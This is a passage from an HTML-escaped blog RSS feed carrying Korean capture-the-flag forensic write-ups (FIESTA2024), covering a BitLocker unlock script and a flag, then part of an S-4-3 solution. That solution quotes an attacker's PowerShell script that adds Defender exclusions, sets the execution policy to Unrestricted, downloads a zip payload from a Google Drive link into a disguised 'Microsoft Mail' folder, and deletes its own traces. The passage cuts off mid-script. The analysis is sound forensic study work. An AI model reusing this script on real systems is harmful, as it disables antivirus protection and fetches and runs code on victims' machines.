&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volumes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-ne&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$osVolume&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Unlock-BitLocker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$volume&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;MountPoint&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Password&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;MS에서 BitLocker 스펙 문서 보니까 어떻게 하면 되는지 나와있어서&lt;/p&gt;

&lt;p&gt;그 점 참고하여 스크립트 작성했다.&lt;/p&gt;

&lt;p&gt;굳이 내가 복호화키를 hardcode 하지 않은 이유는, 저게 rawdata를 네트워크로 가져오는 거라 Key value로 interpreting 할 때 변수가 생길 것 같아서이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그렇게 실행한 결과,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2040.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;암호화를 해제할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그리고 암호화된 설계도면도 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2041.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;(1) dll인젝션에 사용된 dll 파일명 (.dll 포함): version.dll&lt;/p&gt;

  &lt;p&gt;(2) 비트라커의 평문키: Giveme the100BTC!!!&lt;/p&gt;

  &lt;p&gt;(3) 암호화된 파티션 내부 설계도면에 적힌 가격: 150000$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;따라서 &lt;mark&gt;FlAG: FIESTA{version.dll_Giveme the100BTC!!!_150000$}&lt;/mark&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 01 Feb 2025 09:21:02 -0600</pubDate>
        <link>https://touBVa.github.io/blog/reversing/2025-02-02-FIESTA2024-cert1</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/reversing/2025-02-02-FIESTA2024-cert1</guid>
      </item>
    
      <item>
        <title>FIESTA2024 S-4-3 풀이</title>
        <description>
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;문제&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;유출된 파일 이름&lt;/p&gt;

  &lt;p&gt;Flag 형식 = FIESTA{(MD5SUM)}&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;유출된 파일의 MD5SUM값을 입력해야 합니다.&lt;/li&gt;
    &lt;li&gt;해쉬값은 대문자입니다.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;S-4-1에서 쉘스크립트가 실행된 것을 보았다.&lt;/p&gt;

&lt;p&gt;해당 스크립트는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 시스템 경로 예외 추가&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Add-MpPreference&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ExclusionPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Windows\System32&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# PowerShell 실행 정책 설정&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$executionPolicyPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKLM:\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$executionPolicyValue&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Unrestricted&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set-ItemProperty&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$executionPolicyPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ExecutionPolicy&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Value&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$executionPolicyValue&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 압축 라이브러리 추가&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Add-Type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AssemblyName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.IO.Compression.FileSystem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 인터넷 연결 테스트 함수&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Test-InternetConnection&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Net.WebRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://www.google.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Timeout&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HEAD&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$false&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 기본 디렉터리 생성 함수&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Create-BaseDirectory&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$directoryPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Test-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$directoryPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ItemType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$directoryPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] Base Directory Created&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[!] Base Directory Already Exists&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 예외 경로 추가&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Add-MpPreference&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ExclusionPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 파일 다운로드 함수&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Download-File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://www.7-zip.org/a/7z2401-x64.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dest1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\7z.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://drive.usercontent.google.com/u/0/uc?id=1OvkcHZnQd91akAGdaQLNWU_HxjNvv9Hl&amp;amp;export=download&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dest2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\mail.zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.WebClient&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dest1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dest2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] Success Download&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 압축 해제 함수&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;PWUnzip&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$install7z&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\7z.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zipFilePath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\mail.zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$7zipPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\7-Zip\7z.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 7-Zip 설치 및 압축 해제&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Start-Process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$install7z&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/S&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wait&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-PassThru&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$7zipPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zipFilePath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mv&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 파일 숨기기 및 정리 함수&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Hide-Action&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Remove-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\mail.zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Remove-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Mail\7z.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Remove-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\torden\Downloads\mail helper.zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Remove-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Recurse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\torden\Downloads\mail helper&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
